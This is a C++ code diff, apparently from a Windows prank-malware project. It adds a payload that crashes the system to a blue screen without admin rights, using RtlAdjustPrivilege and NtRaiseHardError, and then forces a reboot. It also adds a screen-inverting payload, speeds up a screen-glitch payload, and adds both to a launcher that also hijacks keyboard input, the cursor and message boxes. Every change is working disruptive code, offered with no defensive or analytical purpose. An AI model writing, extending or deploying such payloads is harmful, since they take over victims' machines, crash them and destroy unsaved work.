@@ -17,8 +17,23 @@ std::atomic<int> runtime = 0;
 
 void reboot(void) 
 {
+	// Try to force BSOD first
+	// I like how this method even works in user mode without admin privileges on all Windows versions since XP (or 2000, idk)...
+	// This isn't even an exploit, it's just an undocumented feature.
+	HMODULE ntdll = LoadLibraryA("ntdll");
+	FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
+	FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");
+
+	if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
+		BOOLEAN tmp1; DWORD tmp2;
+		((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
+		((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000022, 0, 0, 0, 6, &tmp2);	// NOTE: this throws an exception in Visual Studio.  It's probably fine :shrug:
+	}
+
+	// If the computer is still running, do it the normal way
 	HANDLE token;
 	TOKEN_PRIVILEGES privileges;
+
 	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);
 
 	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
@@ -27,6 +42,7 @@ void reboot(void)
 
 	AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);
 
+	// The actual restart
 	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
 }
 
@@ -86,11 +102,25 @@ void PayloadScreenGlitch(void)
 	std::uniform_int_distribution<int> cx(200, x);
 	std::uniform_int_distribution<int> cy(200, y);
 
+	int waittime = 15;
+
 	HWND hwnd = GetDesktopWindow();
 	HDC hdc = GetWindowDC(hwnd);
 	for (;;) {
 		BitBlt(hdc, dx(mt), dy(mt), cx(mt), cy(mt), hdc, dx(mt), dx(mt), SRCCOPY);
-		std::this_thread::sleep_for(std::chrono::seconds(5));
+		std::this_thread::sleep_for(std::chrono::seconds(static_cast<int>(waittime - std::floor(runtime / (MAX_RUNTIME / waittime)))));
+	}
+}
+
+void PayloadInvert(void) {
+	HWND hwnd = GetDesktopWindow();
+	HDC hdc = GetWindowDC(hwnd);
+	auto w = GetSystemMetrics(SM_CXSCREEN);
+	auto h = GetSystemMetrics(SM_CYSCREEN);
+
+	for (;;) {
+		BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
+		std::this_thread::sleep_for(std::chrono::seconds(20 - runtime));
 	}
 }
 
@@ -100,14 +130,15 @@ void PayloadScreenGlitch(void)
 //  bsod at end
 void LaunchPayloads(void)
 {
-	std::array<std::function<void(void)>, 4> payloads = {
+	std::array<std::function<void(void)>, 5> payloads = {
 			PayloadKeyboardInput,
 			PayloadCursor,
 			PayloadMessageBox,
-			PayloadScreenGlitch
+			PayloadScreenGlitch,
+			PayloadInvert
 	};
 
-	for (int i = 0; i < payloads.size(); i++) {
+	for (unsigned i = 0; i < payloads.size(); i++) {
 		std::thread(payloads.at(i)).detach();
 		std::this_thread::sleep_for(std::chrono::seconds(5));
 	}
